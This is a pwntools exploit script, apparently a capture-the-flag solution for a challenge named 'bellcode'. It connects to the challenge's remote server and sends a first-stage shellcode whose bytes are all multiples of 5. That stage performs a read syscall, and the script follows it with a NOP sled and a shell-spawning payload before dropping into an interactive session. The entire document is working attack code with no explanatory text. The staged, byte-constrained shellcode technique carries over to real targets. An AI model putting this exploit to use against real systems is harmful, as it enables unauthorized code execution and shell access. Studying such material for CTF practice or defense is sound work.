from pwn import *

context.binary = elf = ELF("./bellcode")

#conn = elf.process()
conn = remote("bellcode.chal.imaginaryctf.org", 1337)

payload = '''
mov esi, 0xfafafafa
xchg eax, esi
push rax
pop rdx

mov esi, 0
xchg eax, esi
push rax
pop rdi

mov esi, 0
xchg eax, esi

mov esi, 0xfac300
syscall
'''
payload = asm(payload)

for n in payload:
  if n%5 != 0:
    print("bad: " + hex(n))

#gdb.attach(conn)
conn.sendline(payload)
conn.sendline(b"\x90"*100 + asm(shellcraft.sh()))
conn.interactive()
